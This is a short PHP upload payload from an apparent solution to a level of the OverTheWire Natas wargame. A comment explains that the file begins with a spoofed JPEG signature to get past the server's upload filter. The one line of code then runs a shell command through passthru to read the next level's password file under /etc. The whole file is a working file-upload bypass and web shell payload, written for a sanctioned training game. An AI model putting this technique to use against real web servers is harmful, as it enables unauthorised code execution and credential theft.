/*
 * This is the script that gets uploaded to the web server for natas14 from
 * http://overthewire.org/wargames/natas/natas14.html. The beginning of this
 * file is spoofed with a JPEG signature so the web server can be bypassed.
*/

ÿØÿÿÙ<? passthru("cat /etc/natas_webpass/natas14"); ?>
